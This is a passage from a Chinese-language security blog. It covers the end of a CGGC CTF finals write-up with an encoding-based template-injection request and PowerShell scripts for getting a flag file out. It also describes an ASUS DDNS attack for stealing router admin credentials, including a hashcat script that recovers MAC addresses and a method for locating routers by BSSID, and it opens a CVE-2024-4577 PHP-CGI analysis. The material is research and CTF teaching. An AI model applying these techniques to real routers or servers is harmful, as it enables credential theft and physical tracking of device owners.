<p>有了這兩個可控的地方，我們就可以找到幾種編碼方式，把不存在的編碼變成存在的字元當成輸入， <code>fuzz</code> 一下就可以找出有效的 <code>payload</code><br>我這邊是使用 <code>cp850</code> 去想辦法構造出 <code>&#123;&#123;config&#125;&#125;</code> ，最後找到 <code>qX%15rx%15▒Bà└│</code> 可以弄出 <code>aaa&#123;&#123;config&#125;&#125;1</code></p>
<p>最終 <code>payload</code> ：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /api/convert HTTP/1.1</span><br><span class="line">Accept-Charset: cp850</span><br><span class="line"></span><br><span class="line">data=qX%15rx%15▒Bà└│&amp;conversion_type=base85&amp;action=encode</span><br></pre></td></tr></table></figure>
<p><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/1.png"></p>
<blockquote>
<p>flag: <code>CGGC&#123;&#39;ÞÑ┐Õ▒àÕ▒àÞÑ┐ÞÑ┐Þ©óÞ¬Æµ£ì&#39;.encode(&#39;cp850&#39;).decode(&#39;utf-8&#39;)&#125;</code></p>
</blockquote>
<h3 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h3><p>我看到超多人交的 <code>flag</code> 是把中間那坨拿去 <code>decode</code> 變成 <code>CGGC&#123;西居居西西踢誒服&#125;</code> ，然後發現不會過又改成 <code>CGGC&#123;CGGCCTF&#125;</code> &#x2F; <code>CGGC&#123;cggcctf&#125;</code> 最後才交上面的，超級好笑我很抱歉抱歉ㄉ心</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Cat-Flag"><a href="#Cat-Flag" class="headerlink" title="Cat Flag"></a>Cat Flag</h2><p>這題是給使用者一個 <code>powershell</code> ，將 <code>flag</code> 寫在圖片裡面，透過 <code>AES-CBC</code> 加密後放在資料夾裡面（我會給密碼），參賽者要想辦法用 <code>powershell</code> 偷出 <code>flag</code></p>
<p>未免也太簡單了對吧？所以我加了一些限制：</p>
<ol>
<li>不能連網，對外連線通通 <code>DROP</code> 掉</li>
<li>指令長度不能超過 512 個字元</li>
<li>輸出字元數量不能超過檔案本身大小</li>
<li>每個 <code>instancer</code> 只能輸入一行指令</li>
<li>每次重開 <code>instancer</code> 都會用不同密碼加密</li>
</ol>
<p>所以，想要弄出 flag 只剩下一條路了，那就是 <code>cat flag</code> </p>
<p>但要怎麼輸出呢？大家馬上聯想到的應該都會是 <code>Base64</code> ，但是其實 <code>base64</code> 會把資料變成大胖呆（原本8個一組的資料變成6個一組），所以比賽現場就會看到一堆人弄出來的圖片長這樣：<br><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/2.png"></p>
<p>啊 <code>flag</code> 咧？在下面被切掉了</p>
<p>我預期的解法有兩種：</p>
<ol>
<li>用 <code>base64</code> 切片抓下來，因為有給密碼了，所以可以透過第一組的明文使用第二組的密碼反向加密回去再和第二組的下半身合併成完整的圖片（這邊是 CBC 的 block cipher 所以要注意不要切爛了會有 padding 的問題）</li>
<li>因為是限制 <code>char</code> 所以可以想辦法把每個 <code>byte</code> 轉成自訂的寬字節就可以一次輸出整個檔案了，但是他又有限制指令只能 <code>512 char</code> ，所以可以找一下有沒有什麼內建的編碼方式是可以涵蓋到大部分的組合，然後在自訂沒涵蓋到的編碼就可以了，我這邊是用一個古老的編碼 <code>X-Europa</code> 把檔案 print 出來</li>
</ol>
<p>編碼：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="string">&quot;cat.flag&quot;</span>);<span class="variable">$compressedStream</span> = <span class="built_in">New-Object</span> System.IO.MemoryStream;<span class="variable">$result</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$encoding</span>=[<span class="type">System.Text.Encoding</span>]::GetEncoding(<span class="string">&quot;x-europa&quot;</span>);<span class="keyword">ForEach</span> (<span class="variable">$byte</span> <span class="keyword">in</span> <span class="variable">$bytes</span>)&#123;<span class="keyword">if</span> (<span class="variable">$byte</span> <span class="operator">-eq</span> <span class="number">0</span>)&#123;<span class="variable">$result</span>+=<span class="string">&quot;嗨&quot;</span>&#125;<span class="keyword">elseif</span>(<span class="variable">$byte</span> <span class="operator">-eq</span> <span class="number">127</span>)&#123;<span class="variable">$result</span>+=<span class="string">&quot;哈&quot;</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$result</span>+=<span class="variable">$encoding</span>.GetString(<span class="variable">$byte</span>)&#125;&#125;;<span class="variable">$result</span></span><br></pre></td></tr></table></figure>

<p>解碼：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$encodedResult</span> = <span class="variable">$result</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encoding</span> = [<span class="type">System.Text.Encoding</span>]::GetEncoding(<span class="string">&quot;x-europa&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$decodedBytes</span> = <span class="built_in">New-Object</span> System.Collections.Generic.List[<span class="built_in">byte</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$i</span> <span class="operator">-lt</span> <span class="variable">$encodedResult</span>.Length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$encodedResult</span>.Substring(<span class="variable">$i</span>, <span class="number">1</span>) <span class="operator">-eq</span> <span class="string">&quot;嗨&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$decodedBytes</span>.Add(<span class="number">0</span>)</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$encodedResult</span>.Substring(<span class="variable">$i</span>, <span class="number">1</span>) <span class="operator">-eq</span> <span class="string">&quot;哈&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$decodedBytes</span>.Add(<span class="number">127</span>)</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">1</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$char</span> = <span class="variable">$encodedResult</span>.Substring(<span class="variable">$i</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="variable">$byte</span> = <span class="variable">$encoding</span>.GetBytes(<span class="variable">$char</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="variable">$decodedBytes</span>.Add(<span class="variable">$byte</span>)</span><br><span class="line">        <span class="variable">$i</span> += <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="string">&quot;flag.enc&quot;</span>,<span class="variable">$decodedBytes</span>)</span><br><span class="line">openssl enc <span class="literal">-d</span> <span class="literal">-aes-256-cbc</span> <span class="literal">-pbkdf2</span> <span class="operator">-in</span> flag.enc <span class="literal">-out</span> flag.jpg <span class="literal">-k</span> <span class="variable">$password</span></span><br></pre></td></tr></table></figure>

<p>弄出來的資料大概會長這樣：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Salted__◀¶8ήρêWΒ▲À§§Τ║ΞÓCΖ↕É3$Ôoο│Ϋ*á‼αύ,&#123;┘ÇÕyPUΪχZ\æUΰal!ë;ΞΈ&gt;♬΄8nÆsÂΰηUv0Z·HO¡λg◘│.~┘ώ↕òΥbQ▼ΖΉPÜΎüκχ┘ΎÄ:q─É└xνϊî/&#x27;ηΊ5ίïΐ?èΘQν&gt;γ0b*kςO6Dv└║Aïί&amp;t◙ºω$↕°δ΄§ΥäΤnΆ1ö♂CοJ▼♪;βJΥΧ(ä.óhώ═2ÅE%δÕ◙◙╝G^Ό!ψ♂M○J╚¿9ºYΥΠΟÍ\○TAlérνyΦβ*Äλz¡&#x27;Ξίê→ÍìΦöίς║7Ñ+_☼/v/Θàξ4GΣLάæS♬6+FρθΕÑRôsÓτδ/┘YØàÅ¿Νό Bωy→Ήχ4e&quot;χÅηαH哈θόψώvu8cçãvßή═PqΏ-‼ΗÂ─ϊΉ│↕τUEÊ║Ά9ώΗέΘDèe&amp;哈ÖÍιwφή◙pάεΕé&quot;╚ËP)9◙╝嗨áω▼0↓哈▲ί→SΔεTSòk£όÕΜÄΡ^┐L%♂oοÑΥüμñΤηòύΡút^ÀΓVRεδ↑ξΰ)Ü○═eN│Ú$b+$°ϊ3Ã¶▲Σçν┐IN♂õΨΈ7z←[:)éÁ8♪◙ºöQMΰν┘QsσΉ♪↑IρΜYΊº°üï·jr↓S&#x27;ε‼ηζς¡4Ø§ΈΟÅ-╝τÚσBΗ?BΙ/x←+Äa♬`g/ϋΟΤëK║]Êãω←ΏÀ£_¡αóÂΰÍ^α└zϋp╔Nï·øáâ2ΘËΌΛÀLL%tÕÓDλmI◘ΦÊ↑ξK-^ë+,\γÄrßP─óÊhη&quot;4♂♬ί:ρ&quot;Iã6jÑΔΌª┌§/[O]αüöΔÂ╚┐:0õ1♂ύBθοÀÑBghϋRsºÀ哈F&quot;▼◘îΜaί;q╔ΞώΧΡBÚ┌·F7哈ύφ哈 μø&lt;À΄)ªö─¿ÁΧτ╔ΦhρMnζΡØz◘cªÆΥêΕ&quot;à_FΣ]Τοπ.Λr♬┌ØΓ#♂έ║Xá¶Ή↔ÂΒώ8/fSV@υÍÕfΓ3ζΚE·όϊ1ãA+|&#x27;ËÑς↓hO┘h╚a&quot;|ïâ9Ά!èàdÉg═xΙóæeΪñήR#&lt;ñ4&#x27;4õUΈά→Ξα◘ù,äέ;?H│&#125;,π7aΒ◀η║χΏ\x◙e1ώÂÂ@Vΐx‼6ΛÅzφ&amp;ύÉâ○όeΑι&lt;─@¶ΐΊu+°ΟªεΝΞΑΙd=7öÅ═+ßÁ\îΙ|嗨f£ΛñùΨßWÂ=΄*·eO,΄άω@XΨC,ìñu΄t JÄ▲dîîóîωI.ρÑ¶æuùÍπGôΡαjìΗù↑õ=ώûΑêηTæ&#123;ÍNVroKüΆώg&lt;euÂΠα`ήξ↓Αkό♬+§ÔόxW▲Ά*ζΘΧΰãΌ╗Læ+ ┐ρü0΄mlϊ4┌Ι]υêαφb¿Οό│]:\ìιΛ y¶άΜ(HúÅY§◘#ÃΕφàS嗨Æù↓Ëê9Gώæ.▼NΖJχ╚Pαè┐@Á(£nÂeìº↓maq§Ν0nØûEÚÕh哈kDGaíυ↔ó@SmabΰκTL‼/Ξy`♀sΠ&#123;mΉKENeΒΏκΥΆ&lt;Γ¶!▶@╗┌MÀϋVv¿$i↕Í↑aUEΈx◀^οΌûP╚◀àMϊk@▲£çèAÄvzÆNæÇέλ9ω▲xt嗨ª└ΓnîAθάï#Ηè↕Ã |y╚έãΤόGjρt·ρø↓r↑Éκtåς1y=É♀1A΄ω=╝┐ΞΠN0éïζΜ◘π|F╔óüα╗ΈôΊ↑υZξΞ_3Ñ♀ξöΟæºψζΜ╚Ãææΰωå♀λΗÆ5nτ♪è5°¡ΨºvΪGΛΜώΒΣ1öΝq╝öôοψW4èaσΝDΤÓs┘o╔=│¶ÉΌ♂ϋcëάbάΔÍbνü┐Ι&amp;ΥTEυBΉϋ↔8ιîΡ═Í!ΆΔΌ+¶2öτ◙zΧΕ[&lt;→,ΆòcÄj-Óf£7Q▶N)ΗΜ&gt;92kκêΫ`↔tφβ┘JwìÇ^ÅX|Τ7~3ê4└Ϋz£ÅκysΏ Y▼ΞôuË\UΜOÄοΉIoíΖB/ZΦΙΝVqwFAXΣ|:╝?έ╝iBV$ΧΫαYn΄a↔ΙBÂ-$Ά▼ι═Mεμλ¶ Ψóύá┌νÓÔ┘▲0σ←R¶εFWω↑sψ?.â#δ§ί┌ΓΉay£%]ΣÁUΟtÖUζνξ/ÔyöC☼╚M▼=;Ι&quot;8─ÄUÖÑΫãΐ&gt;δ4ξή:ΣβºόΛΒ~║O↓Lΐύw&quot;χ♂-↓ÚnèωrÅí◘ΜÚíVtΰ(ΓZPΚiê9FήΟ°r─σ◀ί♬?¿ΓόhXEΈ,υm;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/cat.jpg"></p>
<h3 id="後記-1"><a href="#後記-1" class="headerlink" title="後記"></a>後記</h3><p>這題是用 @chummy 的 <a target="_blank" rel="noopener" href="https://github.com/Jimmy01240397/CTF-Instancer">CTF Instancer</a> 架的，會依序動態開 100 個 port給大家連 instancer ，結果有某海狗直接狂戳 port 幫大家把 instancer 都關起來（我完全沒想到可以這樣玩QQ）</p>
<p><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/4.png"></p>
<p>後來臨時加了驗證 <code>CTFd Token</code> 的機制，感謝賽博水電工 Chummy 現場幫 instancer 加新功能，然後兩個人在那邊寫爛扣<br><img src="/2024/12/07/2024-CGGC-CTF-Final-Writeup/5.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-10-30T18:02:43.000Z" title="2024/10/31 上午2:02:43">2024-10-31</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:44:33.925Z" title="2024/11/17 下午12:44:33">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a></span><span class="level-item">6 分鐘讀完 (大約940個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/">One Million ASUS Routers Under Control: Exploiting ASUS DDNS to MITM Admin Credentials</a></p><div class="content"><h2 id="ASUS-Router-APP-如何在外網連回家"><a href="#ASUS-Router-APP-如何在外網連回家" class="headerlink" title="ASUS Router APP 如何在外網連回家"></a>ASUS Router APP 如何在外網連回家</h2><p>若有開啟DDNS設定，路由器的domain是a+md5(MAC Address).asuscomm.com，手機透過DDNS查詢IP後，再從8443 port連回去。</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="domain-name-由MAC-Address產生"><a href="#domain-name-由MAC-Address產生" class="headerlink" title="domain name 由MAC Address產生"></a>domain name 由MAC Address產生</h3><p>Domain name &#x3D; a + md5(MAC Address) + .asuscomm.com<br>因此，只要知道 router 的 MAC Address，變可以透過網址存取路由器後台。</p>
<h3 id="更新DDNS時未驗證PIN碼"><a href="#更新DDNS時未驗證PIN碼" class="headerlink" title="更新DDNS時未驗證PIN碼"></a>更新DDNS時未驗證PIN碼</h3><p>ASUS在update IP address的時候並沒有驗證router的PIN碼是否正確，所以任何人都可以隨意更改domain指向的ip</p>
<h3 id="帳密裸奔，僅使用base64編碼變傳送"><a href="#帳密裸奔，僅使用base64編碼變傳送" class="headerlink" title="帳密裸奔，僅使用base64編碼變傳送"></a>帳密裸奔，僅使用base64編碼變傳送</h3><p>ASUS Router 手機 APP 在驗證後台帳號密碼時，直接將帳號密碼 Base64 encode 過後，以 GET 的方式傳給 Router 。</p>
<h3 id="組合計"><a href="#組合計" class="headerlink" title="組合計"></a>組合計</h3><p>攻擊者可透過上面三個漏洞達到完美的中間人攻擊，首先，攻擊者可透過網路上洩漏的 MAC Address 取得Domain Name，並且將該Domain指向自己的攻擊機，接著坐等使用者在外網用手機 APP 打開管理介面便可以得到使用者的帳號與密碼，再將帳號密碼傳回真正的IP達成中間人攻擊。</p>
<h3 id="造成危害"><a href="#造成危害" class="headerlink" title="造成危害"></a>造成危害</h3><p>攻擊者可透過後台帳號密碼開啟 ssh vpn等服務，摸進內網，或者是更改預設DNS Server，進行網路釣魚。 </p>
<h2 id="影響"><a href="#影響" class="headerlink" title="影響"></a>影響</h2><p>研究發現全球有多超過100萬台路由器遭受影響，比較明顯的攻擊痕跡可由ddns解析的ip變動看出，或是多個路由器皆將Domain指向同一個ip。</p>
<h1 id="後續研究"><a href="#後續研究" class="headerlink" title="後續研究"></a>後續研究</h1><p>我後來針對ASUS Router的MAC Address、DDNS和BSSID研究了一下之後，發現了一些有趣的事情</p>
<h3 id="MAC-Address-和-BSSID-相同"><a href="#MAC-Address-和-BSSID-相同" class="headerlink" title="MAC Address 和 BSSID 相同"></a>MAC Address 和 BSSID 相同</h3><p>因為手邊沒有太多華碩的路由器，觀察了大概三台路由器，發現MAC Address和BSSID不是完全相同就是差一碼</p>
<h3 id="可由-DDNS-回推-MAC-Address"><a href="#可由-DDNS-回推-MAC-Address" class="headerlink" title="可由 DDNS 回推 MAC Address"></a>可由 DDNS 回推 MAC Address</h3><p>前面研究有提到，預設 DDNS 是 A+md5(MAC Address)，雖然窮舉 MAC Address 是不可能的，但是 MAC Address 前三個 bytes 是廠商識別碼，剩下要解決的就只有後三 bytes 了。</p>
<p>因此我寫了一個 script 可以在一分半之內由 hashcat 將DDNS的MAC Address還原(都4220年了竟然還有人在用md5)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">lst = [<span class="string">&#x27;00:1B:FC&#x27;</span>, <span class="string">&#x27;00:1E:8C&#x27;</span>, <span class="string">&#x27;00:1F:C6&#x27;</span>, <span class="string">&#x27;00:22:15&#x27;</span>, <span class="string">&#x27;00:24:8C&#x27;</span>, <span class="string">&#x27;00:26:18&#x27;</span>, <span class="string">&#x27;04:D9:F5&#x27;</span>, <span class="string">&#x27;08:60:6E&#x27;</span>, <span class="string">&#x27;08:62:66&#x27;</span>, <span class="string">&#x27;08:BF:B8&#x27;</span>, <span class="string">&#x27;0C:9D:92&#x27;</span>, <span class="string">&#x27;10:7B:44&#x27;</span>, <span class="string">&#x27;10:7C:61&#x27;</span>, <span class="string">&#x27;10:BF:48&#x27;</span>, <span class="string">&#x27;10:C3:7B&#x27;</span>, <span class="string">&#x27;14:DA:E9&#x27;</span>, <span class="string">&#x27;14:DD:A9&#x27;</span>, <span class="string">&#x27;24:4B:FE&#x27;</span>, <span class="string">&#x27;2C:4D:54&#x27;</span>, <span class="string">&#x27;2C:56:DC&#x27;</span>, <span class="string">&#x27;2C:FD:A1&#x27;</span>, <span class="string">&#x27;30:5A:3A&#x27;</span>, <span class="string">&#x27;30:85:A9&#x27;</span>, <span class="string">&#x27;34:97:F6&#x27;</span>, <span class="string">&#x27;38:2C:4A&#x27;</span>, <span class="string">&#x27;3C:7C:3F&#x27;</span>, <span class="string">&#x27;40:16:7E&#x27;</span>, <span class="string">&#x27;40:B0:76&#x27;</span>, <span class="string">&#x27;48:5B:39&#x27;</span>, <span class="string">&#x27;4C:ED:FB&#x27;</span>, <span class="string">&#x27;50:46:5D&#x27;</span>, <span class="string">&#x27;50:EB:F6&#x27;</span>, <span class="string">&#x27;60:45:CB&#x27;</span>, <span class="string">&#x27;70:4D:7B&#x27;</span>, <span class="string">&#x27;70:8B:CD&#x27;</span>, <span class="string">&#x27;E8:9C:25&#x27;</span>, <span class="string">&#x27;74:D0:2B&#x27;</span>, <span class="string">&#x27;78:24:AF&#x27;</span>, <span class="string">&#x27;7C:10:C9&#x27;</span>, <span class="string">&#x27;88:D7:F6&#x27;</span>, <span class="string">&#x27;90:E6:BA&#x27;</span>, <span class="string">&#x27;9C:5C:8E&#x27;</span>, <span class="string">&#x27;A0:36:BC&#x27;</span>, <span class="string">&#x27;A8:5E:45&#x27;</span>, <span class="string">&#x27;B0:6E:BF&#x27;</span>, <span class="string">&#x27;BC:AE:C5&#x27;</span>, <span class="string">&#x27;BC:EE:7B&#x27;</span>, <span class="string">&#x27;D0:17:C2&#x27;</span>, <span class="string">&#x27;D4:5D:64&#x27;</span>, <span class="string">&#x27;E0:3F:49&#x27;</span>, <span class="string">&#x27;E0:CB:4E&#x27;</span>, <span class="string">&#x27;CC:28:AA&#x27;</span>, <span class="string">&#x27;60:CF:84&#x27;</span>, <span class="string">&#x27;F0:79:59&#x27;</span>, <span class="string">&#x27;F4:6D:04&#x27;</span>, <span class="string">&#x27;FC:C2:33&#x27;</span>, <span class="string">&#x27;00:0C:6E&#x27;</span>, <span class="string">&#x27;00:0E:A6&#x27;</span>, <span class="string">&#x27;00:11:2F&#x27;</span>, <span class="string">&#x27;00:11:D8&#x27;</span>, <span class="string">&#x27;00:13:D4&#x27;</span>, <span class="string">&#x27;00:15:F2&#x27;</span>, <span class="string">&#x27;00:17:31&#x27;</span>, <span class="string">&#x27;00:18:F3&#x27;</span>, <span class="string">&#x27;00:1A:92&#x27;</span>, <span class="string">&#x27;00:1D:60&#x27;</span>, <span class="string">&#x27;00:23:54&#x27;</span>, <span class="string">&#x27;00:E0:18&#x27;</span>, <span class="string">&#x27;04:42:1A&#x27;</span>, <span class="string">&#x27;04:92:26&#x27;</span>, <span class="string">&#x27;04:D4:C4&#x27;</span>, <span class="string">&#x27;18:31:BF&#x27;</span>, <span class="string">&#x27;1C:87:2C&#x27;</span>, <span class="string">&#x27;1C:B7:2C&#x27;</span>, <span class="string">&#x27;20:CF:30&#x27;</span>, <span class="string">&#x27;38:D5:47&#x27;</span>, <span class="string">&#x27;54:04:A6&#x27;</span>, <span class="string">&#x27;54:A0:50&#x27;</span>, <span class="string">&#x27;58:11:22&#x27;</span>, <span class="string">&#x27;60:A4:4C&#x27;</span>, <span class="string">&#x27;AC:22:0B&#x27;</span>, <span class="string">&#x27;AC:9E:17&#x27;</span>, <span class="string">&#x27;C8:60:00&#x27;</span>, <span class="string">&#x27;C8:7F:54&#x27;</span>, <span class="string">&#x27;D8:50:E6&#x27;</span>, <span class="string">&#x27;F0:2F:74&#x27;</span>, <span class="string">&#x27;F8:32:E4&#x27;</span>, <span class="string">&#x27;FC:34:97&#x27;</span>]</span><br><span class="line">target = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="keyword">if</span> os.system(<span class="string">f&quot;hashcat -m 0 -a 3 <span class="subst">&#123;target&#125;</span> <span class="subst">&#123;i.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;</span>\?H\?H\?H\?H\?H\?H&quot;</span>)==<span class="number">0</span>:</span><br><span class="line">        os.system(<span class="string">f&quot;hashcat -m 0 <span class="subst">&#123;target&#125;</span> --show&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="BSSID可以用來定位Router的真實位置"><a href="#BSSID可以用來定位Router的真實位置" class="headerlink" title="BSSID可以用來定位Router的真實位置"></a>BSSID可以用來定位Router的真實位置</h3><p>當 iPhone 把 Wi-Fi 關閉時，會提示定位精度會下降，因為蘋果會記錄附近router的位置，然後再用來幫手機做更精確的定位，因此，我們有機會使用工具將 BSSID 轉換成實體的經緯度，甚至比GPS更準確。</p>
<h2 id="組合技"><a href="#組合技" class="headerlink" title="組合技"></a>組合技</h2><p>當我們得知了一組ip，如果他使用了 ASUS 的 Router ，並且開啟了外網存取時，我們就可以透過這組 ip 取得 DDNS<br><img src="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/1.png"></p>
<p>然後再透過 DDNS 回推 BSSID<br><img src="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/2.png"></p>
<p>最後反查出座標</p>
<p><img src="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/3.png"><br><img src="/2024/10/31/One-Million-ASUS-Routers-Under-Control-Exploiting-ASUS-DDNS-to-MITM-Admin-Credentials/4.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-08-08T08:32:52.000Z" title="2024/8/8 下午4:32:52">2024-08-08</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:44:55.831Z" title="2024/11/17 下午12:44:55">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CVE/">CVE</a></span><span class="level-item">6 分鐘讀完 (大約835個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/">CVE-2024-4577 PHP CGI漏洞複現及研究</a></p><div class="content"><h1 id="漏洞簡介"><a href="#漏洞簡介" class="headerlink" title="漏洞簡介"></a>漏洞簡介</h1><p>CVE-2024-4577是一個 PHP CGI 的參數注入漏洞，這個漏洞繞過了 CVE-2012-2311 的保護，透過 windows BEST-Fit 的特性，構造不存在的 urlencode 字元讓 Windows 解析出 <code>-</code> 字元，從而繞過 php cgi 的保護機制。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>要了解這個漏洞，我們需要先坐時光機回到最初的漏洞，也就是CVE-2012-2311更之前的 PHP 5.3.11</p>
<h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>首先，我們有一個先備知識要知道，那就是 <code>http server</code> 呼叫 <code>CGI</code> 時，會連同 request 的 query 一起當成參數傳給 <code>CGI</code> ，例如：我今天存取了 <a target="_blank" rel="noopener" href="http://192.168.22.16/php-cgi/php-cgi.exe?foo">http://192.168.22.16/php-cgi/php-cgi.exe?foo</a> 時，<code>apache</code> 啟動<code>CGI</code> 的 commandline 其實長這樣：<br><img src="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/1.png"></p>
<p>因此攻擊者只要構造出開頭為 <code>-</code> 的 querystring ， <code>CGI</code> 就會把他當成參數解析，從而導致參數注入漏洞。</p>
<h3 id="漏洞修補"><a href="#漏洞修補" class="headerlink" title="漏洞修補"></a>漏洞修補</h3><p>針對 CVE-2012–1823 出現的漏洞，PHP在 5.3.12 將漏洞 patch 掉，方法是檢查 <code>querystring</code> 的開頭是不是 <code>-</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-	<span class="keyword">while</span> ((c = php_getopt(argc, argv, OPTIONS, &amp;php_optarg, &amp;php_optind, <span class="number">0</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">+	<span class="keyword">if</span>(query_string = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>)) &#123;</span><br><span class="line">+		decoded_query_string = strdup(query_string);</span><br><span class="line">+		php_url_decode(decoded_query_string, <span class="built_in">strlen</span>(decoded_query_string));</span><br><span class="line">+		<span class="keyword">if</span>(*decoded_query_string == <span class="string">&#x27;-&#x27;</span> &amp;&amp; <span class="built_in">strchr</span>(query_string, <span class="string">&#x27;=&#x27;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">+			skip_getopt = <span class="number">1</span>;</span><br><span class="line">+		&#125;</span><br><span class="line">+		<span class="built_in">free</span>(decoded_query_string);</span><br><span class="line">+	&#125;</span><br><span class="line">+	<span class="keyword">while</span> (!skip_getopt &amp;&amp; (c = php_getopt(argc, argv, OPTIONS, &amp;php_optarg, &amp;php_optind, <span class="number">0</span>)) != <span class="number">-1</span>) &#123;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2012-2311"><a href="#CVE-2012-2311" class="headerlink" title="CVE-2012-2311"></a>CVE-2012-2311</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>在 5.3.12 發佈後不到一個禮拜就被人 bypass 了，因為只要在<code>-</code>前面塞空格就好(?)</p>
<h3 id="漏洞修補-1"><a href="#漏洞修補-1" class="headerlink" title="漏洞修補"></a>漏洞修補</h3><p>PHP官方很快就發佈了 5.3.13 版本，這次他們先把前面的空白都變不見(pointer往後移)，再檢查開頭是不是 <code>-</code></p>
